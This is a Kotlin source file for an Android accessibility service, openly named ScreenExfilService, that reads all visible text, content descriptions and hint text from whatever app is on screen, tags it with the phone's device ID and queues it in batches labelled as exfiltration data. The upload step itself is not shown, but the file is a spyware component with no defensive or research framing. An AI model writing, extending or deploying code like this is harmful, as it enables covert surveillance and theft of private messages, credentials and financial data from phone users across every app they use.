package com.yourpackage.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.yourpackage.data.ExfilData
import com.yourpackage.utils.BatchManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * AccessibilityService that captures all visible screen text from any app.
 * Captures:
 * - All text from the current window
 * - Content descriptions
 * - Any visible text on the screen
 */
class ScreenExfilService : AccessibilityService() {

    companion object {
        private const val TAG = "ScreenExfil"
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var batchManager: BatchManager

    /**
     * Get the unique Android ID for this device.
     * This is dynamic and unique per phone.
     */
    private fun getDeviceId(): String {
        return Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown_device"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "✅ ScreenExfilService connected. Device ID: ${getDeviceId()}")

        // Initialize batch manager
        batchManager = BatchManager { batch ->
            scope.launch {
                Log.d(TAG, "📦 Screen batch ready: ${batch.size} items")
            }
        }
        batchManager.start()

        // Configure accessibility service
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                captureScreenContent(event.packageName?.toString() ?: "unknown")
            }
        }
    }

    /**
     * Capture all visible text from the current window.
     */
    private fun captureScreenContent(packageName: String) {
        try {
            val root = rootInActiveWindow ?: return
            val screenText = extractAllTexts(root)
            if (screenText.isNotEmpty()) {
                val data = mapOf(
                    "type" to "screen_text",
                    "app" to packageName,
                    "texts" to screenText,
                    "count" to screenText.size
                )
                val exfilData = ExfilData(
                    type = "screen_text",
                    app = packageName,
                    data = data.toString(),
                    device_id = getDeviceId() // <-- Dynamic Device ID
                )
                batchManager.add(exfilData)
                Log.d(TAG, "📱 Captured ${screenText.size} text items from $packageName")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error capturing screen content: ${e.message}")
        }
    }

    /**
     * Recursively extract all text from the view hierarchy.
     */
    private fun extractAllTexts(node: AccessibilityNodeInfo): List<String> {
        val texts = mutableListOf<String>()
        val text = node.text?.toString()
        if (text != null && text.isNotBlank()) {
            texts.add(text)
        }
        val contentDesc = node.contentDescription?.toString()
        if (contentDesc != null && contentDesc.isNotBlank() && contentDesc != text) {
            texts.add(contentDesc)
        }
        val hintText = node.hintText?.toString()
        if (hintText != null && hintText.isNotBlank() && hintText != text) {
            texts.add(hintText)
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                texts.addAll(extractAllTexts(child))
                child.recycle()
            }
        }
        return texts
    }

    override fun onInterrupt() {
        Log.d(TAG, "⚠️ ScreenExfilService interrupted")
        batchManager.stop()
    }

    override fun onDestroy() {
        super.onDestroy()
        batchManager.stop()
        Log.d(TAG, "ScreenExfilService destroyed")
    }
}